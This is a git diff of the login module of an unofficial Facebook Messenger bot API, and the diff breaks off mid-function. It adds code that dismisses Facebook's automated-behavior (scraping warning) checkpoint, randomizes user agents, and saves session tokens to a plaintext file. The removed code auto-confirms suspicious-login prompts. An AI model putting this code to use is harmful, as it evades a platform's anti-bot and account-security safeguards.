@@ -1,608 +1,502 @@
 "use strict";
-
 const utils = require("./utils");
-const cheerio = require("cheerio");
-const log = require("npmlog");
-
-let checkVerified = null;
-
-const defaultLogRecordSize = 100;
-log.maxRecordSize = defaultLogRecordSize;
-
-function setOptions(globalOptions, options) {
-	Object.keys(options).map(function (key) {
-		switch (key) {
-			case 'pauseLog':
-				if (options.pauseLog) log.pause();
-				break;
-			case 'online':
-				globalOptions.online = Boolean(options.online);
-				break;
-			case 'logLevel':
-				log.level = options.logLevel;
-				globalOptions.logLevel = options.logLevel;
-				break;
-			case 'logRecordSize':
-				log.maxRecordSize = options.logRecordSize;
-				globalOptions.logRecordSize = options.logRecordSize;
-				break;
-			case 'selfListen':
-				globalOptions.selfListen = Boolean(options.selfListen);
-				break;
-			case 'listenEvents':
-				globalOptions.listenEvents = Boolean(options.listenEvents);
-				break;
-			case 'pageID':
-				globalOptions.pageID = options.pageID.toString();
-				break;
-			case 'updatePresence':
-				globalOptions.updatePresence = Boolean(options.updatePresence);
-				break;
-			case 'forceLogin':
-				globalOptions.forceLogin = Boolean(options.forceLogin);
-				break;
-			case 'userAgent':
-				globalOptions.userAgent = options.userAgent;
-				break;
-			case 'autoMarkDelivery':
-				globalOptions.autoMarkDelivery = Boolean(options.autoMarkDelivery);
-				break;
-			case 'autoMarkRead':
-				globalOptions.autoMarkRead = Boolean(options.autoMarkRead);
-				break;
-			case 'listenTyping':
-				globalOptions.listenTyping = Boolean(options.listenTyping);
-				break;
-			case 'proxy':
-				if (typeof options.proxy != "string") {
-					delete globalOptions.proxy;
-					utils.setProxy();
-				} else {
-					globalOptions.proxy = options.proxy;
-					utils.setProxy(globalOptions.proxy);
-				}
-				break;
-			case 'autoReconnect':
-				globalOptions.autoReconnect = Boolean(options.autoReconnect);
-				break;
-			case 'emitReady':
-				globalOptions.emitReady = Boolean(options.emitReady);
-				break;
-			default:
-				log.warn("setOptions", "Unrecognized option given to setOptions: " + key);
-				break;
-		}
-	});
+const fs = require("fs");
+const cron = require("node-cron");
+let globalOptions = {};
+let ctx = null;
+let _defaultFuncs = null;
+let api = null;
+let region;
+const errorRetrieving = "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.";
+async function setOptions(globalOptions_from, options = {}) {
+  Object.keys(options).map((key) => {
+    switch (key) {
+      case 'online':
+        globalOptions_from.online = Boolean(options.online);
+        break;
+      case 'selfListen':
+        globalOptions_from.selfListen = Boolean(options.selfListen);
+        break;
+      case 'selfListenEvent':
+        globalOptions_from.selfListenEvent = options.selfListenEvent;
+        break;
+      case 'listenEvents':
+        globalOptions_from.listenEvents = Boolean(options.listenEvents);
+        break;
+      case 'pageID':
+        globalOptions_from.pageID = options.pageID.toString();
+        break;
+      case 'updatePresence':
+        globalOptions_from.updatePresence = Boolean(options.updatePresence);
+        break;
+      case 'forceLogin':
+        globalOptions_from.forceLogin = Boolean(options.forceLogin);
+        break;
+      case 'userAgent':
+        globalOptions_from.userAgent = options.userAgent;
+        break;
+      case 'autoMarkDelivery':
+        globalOptions_from.autoMarkDelivery = Boolean(options.autoMarkDelivery);
+        break;
+      case 'autoMarkRead':
+        globalOptions_from.autoMarkRead = Boolean(options.autoMarkRead);
+        break;
+      case 'listenTyping':
+        globalOptions_from.listenTyping = Boolean(options.listenTyping);
+        break;
+      case 'proxy':
+        if (typeof options.proxy != "string") {
+          delete globalOptions_from.proxy;
+          utils.setProxy();
+        } else {
+          globalOptions_from.proxy = options.proxy;
+          utils.setProxy(globalOptions_from.proxy);
+        }
+        break;
+      case 'autoReconnect':
+        globalOptions_from.autoReconnect = Boolean(options.autoReconnect);
+        break;
+      case 'emitReady':
+        globalOptions_from.emitReady = Boolean(options.emitReady);
+        break;
+      case 'randomUserAgent':
+        globalOptions_from.randomUserAgent = Boolean(options.randomUserAgent);
+        if (globalOptions_from.randomUserAgent) {
+          globalOptions_from.userAgent = utils.randomUserAgent();
+          utils.warn("Random user agent enabled. This is an EXPERIMENTAL feature and I think this won't on some accounts. turn it on at your own risk. Contact the owner for more information about experimental features.");
+          utils.warn("randomUserAgent", "UA selected:", globalOptions_from.userAgent);
+        }
+        break;
+      case 'bypassRegion':
+        globalOptions_from.bypassRegion = options.bypassRegion;
+        break;
+      default:
+        break;
+    }
+  });
+  globalOptions = globalOptions_from;
 }
 
-function buildAPI(globalOptions, html, jar) {
-	const maybeCookie = jar.getCookies("https://www.facebook.com").filter(function (val) {
-		return val.cookieString().split("=")[0] === "c_user";
-	});
-
-	const objCookie = jar.getCookies("https://www.facebook.com").reduce(function (obj, val) {
-		obj[val.cookieString().split("=")[0]] = val.cookieString().split("=")[1];
-		return obj;
-	}, {});
-
-	if (maybeCookie.length === 0) {
-		throw { error: "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify." };
-	}
-
-	if (html.indexOf("/checkpoint/block/?next") > -1) {
-		log.warn("login", "Checkpoint detected. Please log in with a browser to verify.");
-	}
-
-	const userID = maybeCookie[0].cookieString().split("=")[1].toString();
-	const i_userID = objCookie.i_user || null;
-	log.info("login", `Logged in as ${userID}`);
-
-	try {
-		clearInterval(checkVerified);
-	} catch (_) { }
-
-	const clientID = (Math.random() * 2147483648 | 0).toString(16);
-
-	const oldFBMQTTMatch = html.match(/irisSeqID:"(.+?)",appID:219994525426954,endpoint:"(.+?)"/);
-	let mqttEndpoint = null;
-	let region = null;
-	let irisSeqID = null;
-	let noMqttData = null;
-
-	if (oldFBMQTTMatch) {
-		irisSeqID = oldFBMQTTMatch[1];
-		mqttEndpoint = oldFBMQTTMatch[2];
-		region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
-
-	} else {
-		const newFBMQTTMatch = html.match(/{"app_id":"219994525426954","endpoint":"(.+?)","iris_seq_id":"(.+?)"}/);
-		if (newFBMQTTMatch) {
-			irisSeqID = newFBMQTTMatch[2];
-			mqttEndpoint = newFBMQTTMatch[1].replace(/\\\//g, "/");
-			region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
-
-		} else {
-			const legacyFBMQTTMatch = html.match(/(\["MqttWebConfig",\[\],{fbid:")(.+?)(",appID:219994525426954,endpoint:")(.+?)(",pollingEndpoint:")(.+?)(3790])/);
-			if (legacyFBMQTTMatch) {
-				mqttEndpoint = legacyFBMQTTMatch[4];
-				region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
-				log.warn("login", `Cannot get sequence ID with new RegExp. Fallback to old RegExp (without seqID)...`);
-				log.info("login", `Got this account's message region: ${region}`);
-				log.info("login", `[Unused] Polling endpoint: ${legacyFBMQTTMatch[6]}`);
-
-			} else {
-				log.warn("login", "Cannot get MQTT region & sequence ID.");
-				noMqttData = html;
-			}
-		}
-	}
-
-	// All data available to api functions
-	const ctx = {
-		userID: userID,
-		i_userID: i_userID,
-		jar: jar,
-		clientID: clientID,
-		globalOptions: globalOptions,
-		loggedIn: true,
-		access_token: 'NONE',
-		clientMutationId: 0,
-		mqttClient: undefined,
-		lastSeqId: irisSeqID,
-		syncToken: undefined,
-		wsReqNumber: 0,
-		wsTaskNumber: 0,
-		reqCallbacks: {},
-		mqttEndpoint,
-		region,
-		firstListen: true
-	};
-
-	const api = {
-		setOptions: setOptions.bind(null, globalOptions),
-		getAppState: function getAppState() {
-			const appState = utils.getAppState(jar);
-			// filter duplicate
-			return appState.filter((item, index, self) => self.findIndex((t) => { return t.key === item.key; }) === index);
-		}
-	};
-
-	if (noMqttData) {
-		api["htmlData"] = noMqttData;
-	}
-
-	const apiFuncNames = [
-		'addExternalModule',
-		'addUserToGroup',
-		'changeAdminStatus',
-		'changeArchivedStatus',
-		'changeAvatar',
-		'changeBio',
-		'changeBlockedStatus',
-		'changeGroupImage',
-		'changeNickname',
-		'changeThreadColor',
-		'changeThreadEmoji',
-		'createNewGroup',
-		'createPoll',
-		'deleteMessage',
-		'deleteThread',
-		'forwardAttachment',
-		'getCurrentUserID',
-		'getEmojiUrl',
-		'getFriendsList',
-		'getMessage',
-		'getThreadHistory',
-		'getThreadInfo',
-		'getThreadList',
-		'getThreadPictures',
-		'getUserID',
-		'getUserInfo',
-		'handleFriendRequest',
-		'handleMessageRequest',
-		'listenMqtt',
-		'logout',
-		'markAsDelivered',
-		'markAsRead',
-		'markAsReadAll',
-		'markAsSeen',
-		'muteThread',
-		'refreshFb_dtsg',
-		'removeUserFromGroup',
-		'resolvePhotoUrl',
-		'searchForThread',
-		'sendMessage',
-		'sendTypingIndicator',
-		'setMessageReaction',
-		'setPostReaction',
-		'setTitle',
-		'threadColors',
-		'unsendMessage',
-		'unfriend',
-		'uploadAttachment',
-		'editMessage',
-
-		// HTTP
-		'httpGet',
-		'httpPost',
-		'httpPostFormData'
-	];
-
-	const defaultFuncs = utils.makeDefaults(html, userID, ctx);
-
-	// Load all api functions in a loop
-	apiFuncNames.map(v => api[v] = require('./src/' + v)(defaultFuncs, api, ctx));
-
-	return [ctx, defaultFuncs, api];
+async function updateDTSG(res, appstate, userId) {
+  try {
+    const appstateCUser = (appstate.find(i => i.key == 'i_user') || appstate.find(i => i.key == 'c_user'))
+    const UID = userId || appstateCUser.value;
+    if (!res || !res.body) {
+      throw new Error("Invalid response: Response body is missing.");
+    }
+    const fb_dtsg = utils.getFrom(res.body, '["DTSGInitData",[],{"token":"', '","');
+    const jazoest = utils.getFrom(res.body, 'jazoest=', '",');
+    if (fb_dtsg && jazoest) {
+      const filePath = 'fb_dtsg_data.json';
+      let existingData = {};
+      if (fs.existsSync(filePath)) {
+        const fileContent = fs.readFileSync(filePath, 'utf8');
+        existingData = JSON.parse(fileContent);
+      }
+      existingData[UID] = {
+        fb_dtsg,
+        jazoest
+      };
+      fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2), 'utf8');
+    }
+    return res;
+  } catch (error) {
+    utils.error(`Error updating DTSG for user ${userId}: ${error.message}`);
+    return;
+  }
 }
 
-function makeLogin(jar, email, password, loginOptions, callback, prCallback) {
-	return function (res) {
-		const html = res.body;
-		const $ = cheerio.load(html);
-		let arr = [];
 
-		// This will be empty, but just to be sure we leave it
-		$("#login_form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));
-
-		arr = arr.filter(function (v) {
-			return v.val && v.val.length;
-		});
-
-		const form = utils.arrToForm(arr);
-		form.lsd = utils.getFrom(html, "[\"LSD\",[],{\"token\":\"", "\"}");
-		form.lgndim = Buffer.from("{\"w\":1440,\"h\":900,\"aw\":1440,\"ah\":834,\"c\":24}").toString('base64');
-		form.email = email;
-		form.pass = password;
-		form.default_persistent = '0';
-		form.lgnrnd = utils.getFrom(html, "name=\"lgnrnd\" value=\"", "\"");
-		form.locale = 'en_US';
-		form.timezone = '240';
-		form.lgnjs = ~~(Date.now() / 1000);
-
-
-		// Getting cookies from the HTML page... (kill me now plz)
-		// we used to get a bunch of cookies in the headers of the response of the
-		// request, but FB changed and they now send those cookies inside the JS.
-		// They run the JS which then injects the cookies in the page.
-		// The "solution" is to parse through the html and find those cookies
-		// which happen to be conveniently indicated with a _js_ in front of their
-		// variable name.
-		//
-		// ---------- Very Hacky Part Starts -----------------
-		const willBeCookies = html.split("\"_js_");
-		willBeCookies.slice(1).map(function (val) {
-			const cookieData = JSON.parse("[\"" + utils.getFrom(val, "", "]") + "]");
-			jar.setCookie(utils.formatCookie(cookieData, "facebook"), "https://www.facebook.com");
-		});
-		// ---------- Very Hacky Part Ends -----------------
-
-
-		return utils
-			.post("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", jar, form, loginOptions)
-			.then(utils.saveCookies(jar))
-			.then(function (res) {
-				const headers = res.headers;
-				if (!headers.location) throw { error: "Wrong username/password." };
-
-				// This means the account has login approvals turned on.
-				if (headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {
-					log.info("login", "You have login approvals turned on.");
-					const nextURL = 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php';
-
-					return utils
-						.get(headers.location, jar, null, loginOptions)
-						.then(utils.saveCookies(jar))
-						.then(function (res) {
-							const html = res.body;
-							// Make the form in advance which will contain the fb_dtsg and nh
-							const $ = cheerio.load(html);
-							let arr = [];
-							$("form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));
-
-							arr = arr.filter(function (v) {
-								return v.val && v.val.length;
-							});
-
-							const form = utils.arrToForm(arr);
-							if (html.indexOf("checkpoint/?next") > -1) {
-								setTimeout(() => {
-									checkVerified = setInterval((_form) => { }, 5000, {
-										fb_dtsg: form.fb_dtsg,
-										jazoest: form.jazoest,
-										dpr: 1
-									});
-								}, 2500);
-								throw {
-									error: 'login-approval',
-									continue: function submit2FA(code) {
-										form.approvals_code = code;
-										form['submit[Continue]'] = $("#checkpointSubmitButton").html(); //'Continue';
-										let prResolve = null;
-										let prReject = null;
-										const rtPromise = new Promise(function (resolve, reject) {
-											prResolve = resolve;
-											prReject = reject;
-										});
-										if (typeof code == "string") {
-											utils
-												.post(nextURL, jar, form, loginOptions)
-												.then(utils.saveCookies(jar))
-												.then(function (res) {
-													const $ = cheerio.load(res.body);
-													const error = $("#approvals_code").parent().attr("data-xui-error");
-													if (error) {
-														throw {
-															error: 'login-approval',
-															errordesc: "Invalid 2FA code.",
-															lerror: error,
-															continue: submit2FA
-														};
-													}
-												})
-												.then(function () {
-													// Use the same form (safe I hope)
-													delete form.no_fido;
-													delete form.approvals_code;
-													form.name_action_selected = 'dont_save'; //'save_device';
-
-													return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
-												})
-												.then(function (res) {
-													const headers = res.headers;
-													if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: "Something went wrong with login approvals." };
-
-													const appState = utils.getAppState(jar);
-
-													if (callback === prCallback) {
-														callback = function (err, api) {
-															if (err) return prReject(err);
-															return prResolve(api);
-														};
-													}
-
-													// Simply call loginHelper because all it needs is the jar
-													// and will then complete the login process
-													return loginHelper(appState, email, password, loginOptions, callback);
-												})
-												.catch(function (err) {
-													// Check if using Promise instead of callback
-													if (callback === prCallback) prReject(err);
-													else callback(err);
-												});
-										} else {
-											utils
-												.post("https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php", jar, form, loginOptions, null, { "Referer": "https://www.facebook.com/checkpoint/?next" })
-												.then(utils.saveCookies(jar))
-												.then(res => {
-													try {
-														JSON.parse(res.body.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, ""));
-													} catch (ex) {
-														clearInterval(checkVerified);
-														log.info("login", "Verified from browser. Logging in...");
-														if (callback === prCallback) {
-															callback = function (err, api) {
-																if (err) return prReject(err);
-																return prResolve(api);
-															};
-														}
-														return loginHelper(utils.getAppState(jar), email, password, loginOptions, callback);
-													}
-												})
-												.catch(ex => {
-													log.error("login", ex);
-													if (callback === prCallback) prReject(ex);
-													else callback(ex);
-												});
-										}
-										return rtPromise;
-									}
-								};
-							} else {
-								if (!loginOptions.forceLogin) throw { error: "Couldn't login. Facebook might have blocked this account. Please login with a browser or enable the option 'forceLogin' and try again." };
-
-								if (html.indexOf("Suspicious Login Attempt") > -1) form['submit[This was me]'] = "This was me";
-								else form['submit[This Is Okay]'] = "This Is Okay";
-
-								return utils
-									.post(nextURL, jar, form, loginOptions)
-									.then(utils.saveCookies(jar))
-									.then(function () {
-										// Use the same form (safe I hope)
-										form.name_action_selected = 'save_device';
-
-										return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
-									})
-									.then(function (res) {
-										const headers = res.headers;
-
-										if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: "Something went wrong with review recent login." };
-
-										const appState = utils.getAppState(jar);
-
-										// Simply call loginHelper because all it needs is the jar
-										// and will then complete the login process
-										return loginHelper(appState, email, password, loginOptions, callback);
-									})
-									.catch(e => callback(e));
-							}
-						});
-				}
-
-				return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));
-			});
-	};
+let isBehavior = false;
+async function bypassAutoBehavior(resp, jar, appstate, ID) {
+  try {
+    const appstateCUser = (appstate.find(i => i.key == 'c_user') || appstate.find(i => i.key == 'i_user'))
+    const UID = ID || appstateCUser.value;
+    const FormBypass = {
+      av: UID,
+      fb_api_caller_class: "RelayModern",
+      fb_api_req_friendly_name: "FBScrapingWarningMutation",
+      variables: JSON.stringify({}),
+      server_timestamps: true,
+      doc_id: 6339492849481770
+    }
+    const kupal = () => {
+      utils.warn(`We suspect automated behavior on account ${UID}. Some accounts might experience auto logout, and you need to resubmit your appstate again every automated behavior detection.`);
+      if (!isBehavior) isBehavior = true;
+    };
+    if (resp) {
+      if (resp.request.uri && resp.request.uri.href.includes("https://www.facebook.com/checkpoint/")) {
+        if (resp.request.uri.href.includes('601051028565049')) {
+          const fb_dtsg = utils.getFrom(resp.body, '["DTSGInitData",[],{"token":"', '","');
+          const jazoest = utils.getFrom(resp.body, 'jazoest=', '",');
+          const lsd = utils.getFrom(resp.body, "[\"LSD\",[],{\"token\":\"", "\"}");
+          return utils.post("https://www.facebook.com/api/graphql/", jar, {
+            ...FormBypass,
+            fb_dtsg,
+            jazoest,
+            lsd
+          }, globalOptions).then(utils.saveCookies(jar)).then(res => {
+            kupal();
+            return res;
+          });
+        } else return resp;
+      } else return resp;
+    }
+  } catch (e) {
+    utils.error(e);
+  }
 }
 
-// Helps the login
-function loginHelper(appState, email, password, globalOptions, callback, prCallback) {
-	let mainPromise = null;
-	const jar = utils.getJar();
-
-	// If we're given an appState we loop through it and save each cookie
-	// back into the jar.
-	if (appState) {
-		// check and convert cookie to appState
-		if (utils.getType(appState) === 'Array' && appState.some(c => c.name)) {
-			appState = appState.map(c => {
-				c.key = c.name;
-				delete c.name;
-				return c;
-			});
-		}
-		else if (utils.getType(appState) === 'String') {
-			const arrayAppState = [];
-			appState.split(';').forEach(c => {
-				const [key, value] = c.split('=');
-
-				arrayAppState.push({
-					key: (key || "").trim(),
-					value: (value || "").trim(),
-					domain: "facebook.com",
-					path: "/",
-					expires: new Date().getTime() + 1000 * 60 * 60 * 24 * 365
-				});
-			});
-			appState = arrayAppState;
-		}
-
-		appState.map(function (c) {
-			const str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
-			jar.setCookie(str, "http://" + c.domain);
-		});
-
-		// Load the main page.
-		mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));
-	} else {
-		// Open the main page, then we login with the given credentials and finally
-		// load the main page again (it'll give us some IDs that we need)
-		mainPromise = utils
-			.get("https://www.facebook.com/", null, null, globalOptions, { noRef: true })
-			.then(utils.saveCookies(jar))
-			.then(makeLogin(jar, email, password, globalOptions, callback, prCallback))
-			.then(function () {
-				return utils.get('https://www.facebook.com/', jar, null, globalOptions).then(utils.saveCookies(jar));
-			});
-	}
-
-
-	let redirectArr = [1, "https://m.facebook.com/"];
-	let ctx;
-	let api;
-	function checkAndFixErr(res) {
-		const reg_antierr = /This browser is not supported/gs;
-		if (reg_antierr.test(res.body)) {
-			const Data = JSON.stringify(res.body);
-			const Dt_Check = Data.split('2Fhome.php&amp;gfid=')[1];
-			if (Dt_Check == undefined) return res;
-			const fid = Dt_Check.split("\\\\")[0];
-			if (Dt_Check == undefined || Dt_Check == "") return res;
-			const final_fid = fid.split(`\\`)[0];
-			if (final_fid == undefined || final_fid == '') return res;
-			const redirectlink = redirectArr[1] + "a/preferences.php?basic_site_devices=m_basic&uri=" + encodeURIComponent("https://m.facebook.com/home.php") + "&gfid=" + final_fid;
-			return utils.get(redirectlink, jar, null, globalOptions).then(utils.saveCookies(jar));
-		}
-		else return res;
-	}
-
-	function redirect(res) {
-		const reg = /<meta http-equiv="refresh" content="0;url=([^"]+)[^>]+>/;
-		redirectArr = reg.exec(res.body);
-		if (redirectArr && redirectArr[1]) return utils.get(redirectArr[1], jar, null, globalOptions).then(utils.saveCookies(jar));
-		return res;
-	}
-
-	mainPromise = mainPromise
-		.then(res => redirect(res))
-		.then(res => checkAndFixErr(res))
-		//fix via login with defaut UA return WWW.facebook.com not m.facebook.com
-		.then(function (res) {
-			const Regex_Via = /MPageLoadClientMetrics/gs; //default for normal account, can easily get region, without this u can't get region in some case but u can run normal
-			if (!Regex_Via.test(res.body)) {
-				//www.facebook.com
-				globalOptions.userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1";
-				return utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));
-			}
-			else return res;
-		})
-		.then(res => redirect(res))
-		.then(res => checkAndFixErr(res))
-		.then(function (res) {
-			const html = res.body;
-			const stuff = buildAPI(globalOptions, html, jar);
-			ctx = stuff[0];
-			api = stuff[2];
-			return res;
-		});
-
-	// given a pageID we log in as a page
-	if (globalOptions.pageID) {
-		mainPromise = mainPromise
-			.then(function () {
-				return utils.get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);
-			})
-			.then(function (resData) {
-				let url = utils.getFrom(resData.body, 'window.location.replace("https:\\/\\/www.facebook.com\\', '");').split('\\').join('');
-				url = url.substring(0, url.length - 1);
-				return utils.get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);
-			});
-	}
-
-	// At the end we call the callback or catch an exception
-	mainPromise
-		.then(function () {
-			log.info("login", 'Done logging in.');
-			return callback(null, api);
-		})
-		.catch(function (e) {
-			log.error("login", e.error || e);
-			callback(e);
-		});
+async function checkIfSuspended(resp, appstate) {
+  try {
+    const appstateCUser = (appstate.find(i => i.key == 'c_user') || appstate.find(i => i.key == 'i_user'))
+    const UID = appstateCUser?.value;
+    const suspendReasons = {};
+    if (resp) {
+      if (resp.request.uri && resp.request.uri.href.includes("https://www.facebook.com/checkpoint/")) {
+        if (resp.request.uri.href.includes('1501092823525282')) {
+          const daystoDisable = resp.body?.match(/"log_out_uri":"(.*?)","title":"(.*?)"/);
+          if (daystoDisable && daystoDisable[2]) {
+            suspendReasons.durationInfo = daystoDisable[2];
+            utils.error(`Suspension time remaining:`, suspendReasons.durationInfo);
+          }
+          const reasonDescription = resp.body?.match(/"reason_section_body":"(.*?)"/);
+          if (reasonDescription && reasonDescription[1]) {
+            suspendReasons.longReason = reasonDescription?.[1];
+            const reasonReplace = suspendReasons?.longReason?.toLowerCase()?.replace("your account, or activity on it, doesn't follow our community standards on ", "");
+            suspendReasons.shortReason = reasonReplace?.substring(0, 1).toUpperCase() + reasonReplace?.substring(1);
+            utils.error(`Alert on ${UID}:`, `Account has been suspended!`);
+            utils.error(`Why suspended:`, suspendReasons.longReason)
+            utils.error(`Reason on suspension:`, suspendReasons.shortReason);
+          }
+          ctx = null;
+          return {
+            suspended: true,
+            suspendReasons
+          }
+        }
+      } else return;
+    }
+  } catch (error) {
+    return;
+  }
 }
 
-function login(loginData, options, callback) {
-	if (utils.getType(options) === 'Function' || utils.getType(options) === 'AsyncFunction') {
-		callback = options;
-		options = {};
-	}
+async function checkIfLocked(resp, appstate) {
+  try {
+    const appstateCUser = (appstate.find(i => i.key == 'c_user') || appstate.find(i => i.key == 'i_user'))
+    const UID = appstateCUser?.value;
+    const lockedReasons = {};
+    if (resp) {
+      if (resp.request.uri && resp.request.uri.href.includes("https://www.facebook.com/checkpoint/")) {
+        if (resp.request.uri.href.includes('828281030927956')) {
+          const lockDesc = resp.body.match(/"is_unvetted_flow":true,"title":"(.*?)"/);
+          if (lockDesc && lockDesc[1]) {
+            lockedReasons.reason = lockDesc[1];
+            utils.error(`Alert on ${UID}:`, lockedReasons.reason);
+          }
+          ctx = null;
+          return {
+            locked: true,
+            lockedReasons
+          }
+        }
+      } else return;
+    }
+  } catch (e) {
+    utils.error("error", e);
+  }
+}
 
-	const globalOptions = {
-		selfListen: false,
-		selfListenEvent: false,
-		listenEvents: false,
-		listenTyping: false,
-		updatePresence: false,
-		forceLogin: false,
-		autoMarkDelivery: true,
-		autoMarkRead: false,
-		autoReconnect: true,
-		logRecordSize: defaultLogRecordSize,
-		online: false,
-		emitReady: false,
-		userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18"
-	};
+function buildAPI(html, jar) {
+  let fb_dtsg;
+  let userID;
+  const tokenMatch = html.match(/DTSGInitialData.*?token":"(.*?)"/);
+  if (tokenMatch) {
+    fb_dtsg = tokenMatch[1];
+  }
+  //hajime pogi
+  //@Kenneth Panio: i fixed the cookie do not change or remove this line what it does? we know that facebook account allow multiple profile in single account so it allow us to login which specific profile we use
+  let cookie = jar.getCookies("https://www.facebook.com");
+  let primary_profile = cookie.filter(function(val) {
+    return val.cookieString().split("=")[0] === "c_user";
+  });
+  let secondary_profile = cookie.filter(function(val) {
+    return val.cookieString().split("=")[0] === "i_user";
+  });
+  if (primary_profile.length === 0 && secondary_profile.length === 0) {
+    throw {
+      error: errorRetrieving,
+    };
+  } else {
+    if (html.indexOf("/checkpoint/block/?next") > -1) {
+      return utils.warn(
+        "login",
+        "Checkpoint detected. Please log in with a browser to verify."
+      );
+    }
+    if (secondary_profile[0] && secondary_profile[0].cookieString().includes('i_user')) {
+      userID = secondary_profile[0].cookieString().split("=")[1].toString();
+    } else {
+      userID = primary_profile[0].cookieString().split("=")[1].toString();
+    }
+  }
+  utils.log("Logged in!");
+  const clientID = (Math.random() * 2147483648 | 0).toString(16);
+  const CHECK_MQTT = {
+    oldFBMQTTMatch: html.match(/irisSeqID:"(.+?)",appID:219994525426954,endpoint:"(.+?)"/),
+    newFBMQTTMatch: html.match(/{"app_id":"219994525426954","endpoint":"(.+?)","iris_seq_id":"(.+?)"}/),
+    legacyFBMQTTMatch: html.match(/\["MqttWebConfig",\[\],{"fbid":"(.*?)","appID":219994525426954,"endpoint":"(.*?)","pollingEndpoint":"(.*?)"/)
+  }
+  let Slot = Object.keys(CHECK_MQTT);
+  let mqttEndpoint, irisSeqID;
+  Object.keys(CHECK_MQTT).map((MQTT) => {
+    if (globalOptions.bypassRegion) return;
+    if (CHECK_MQTT[MQTT] && !region) {
+      switch (Slot.indexOf(MQTT)) {
+        case 0: {
+          irisSeqID = CHECK_MQTT[MQTT][1];
+          mqttEndpoint = CHECK_MQTT[MQTT][2].replace(/\\\//g, "/");
+          region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
+          break;
+        }
+        case 1: {
+          irisSeqID = CHECK_MQTT[MQTT][2];
+          mqttEndpoint = CHECK_MQTT[MQTT][1].replace(/\\\//g, "/");
+          region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
+          break;
+        }
+        case 2: {
+          mqttEndpoint = CHECK_MQTT[MQTT][2].replace(/\\\//g, "/"); //this really important.
+          region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
+          break;
+        }
+      }
+      return;
+    }
+  });
+  if (globalOptions.bypassRegion)
+    region = globalOptions.bypassRegion.toUpperCase();
+  else if (!region)
+    region = ["prn", "pnb", "vll", "hkg", "sin", "ftw", "ash"][Math.random() * 5 | 0].toUpperCase();
+  if (globalOptions.bypassRegion || !mqttEndpoint)
+    mqttEndpoint = "wss://edge-chat.facebook.com/chat?region=" + region;
+  let ctx = {
+    userID,
+    jar,
+    clientID,
+    globalOptions,
+    loggedIn: true,
+    access_token: 'NONE',
+    clientMutationId: 0,
+    mqttClient: undefined,
+    lastSeqId: irisSeqID,
+    syncToken: undefined,
+    mqttEndpoint,
+    wsReqNumber: 0,
+    wsTaskNumber: 0,
+    reqCallbacks: {},
+    region,
+    firstListen: true,
+    fb_dtsg
+  };
+  cron.schedule('0 0 * * *', () => {
+    const fbDtsgData = JSON.parse(fs.readFileSync('fb_dtsg_data.json', 'utf8'));
+    if (fbDtsgData && fbDtsgData[userID]) {
+      const userFbDtsg = fbDtsgData[userID];
+      api.refreshFb_dtsg(userFbDtsg)
+        .then(() => utils.log(`Fb_dtsg refreshed successfully for user ${userID}.`))
+        .catch((err) => utils.error(`Error during Fb_dtsg refresh for user ${userID}:`, err));
+    } else {
+      utils.error(`No fb_dtsg data found for user ${userID}.`);
+    }
+  }, {
+    timezone: 'Asia/Manila'
+  });
+  let defaultFuncs = utils.makeDefaults(html, userID, ctx);
+  return [ctx, defaultFuncs];
+}
 
-	setOptions(globalOptions, options);
+async function loginHelper(appState, email, password, apiCustomized = {}, callback) {
+  let mainPromise = null;
+  const jar = utils.getJar();
+  utils.log('Logging in...');
+  if (appState) {
+    if (utils.getType(appState) === 'Array' && appState.some(c => c.name)) {
+      appState = appState.map(c => {
+        c.key = c.name;
+        delete c.name;
+        return c;
+      });
+    }
+    else if (utils.getType(appState) === 'String') {
+      const arrayAppState = [];
+      appState.split(';').forEach(c => {
+        const [key, value] = c.split('=');
+        arrayAppState.push({
+          key: (key || "").trim(),
+          value: (value || "").trim(),
+          domain: ".facebook.com",
+          path: "/",
+          expires: new Date().getTime() + 1000 * 60 * 60 * 24 * 365
+        });
+      });
+      appState = arrayAppState;
+    }
 
-	let prCallback = null;
-	let returnPromise;
-	if (utils.getType(callback) !== "Function" && utils.getType(callback) !== "AsyncFunction") {
-		let rejectFunc = null;
-		let resolveFunc = null;
-		returnPromise = new Promise(function (resolve, reject) {
-			resolveFunc = resolve;
-			rejectFunc = reject;
-		});
-		prCallback = function (error, api) {
-			if (error) {
-				return rejectFunc(error);
-			}
-			return resolveFunc(api);
-		};
-		callback = prCallback;
-	}
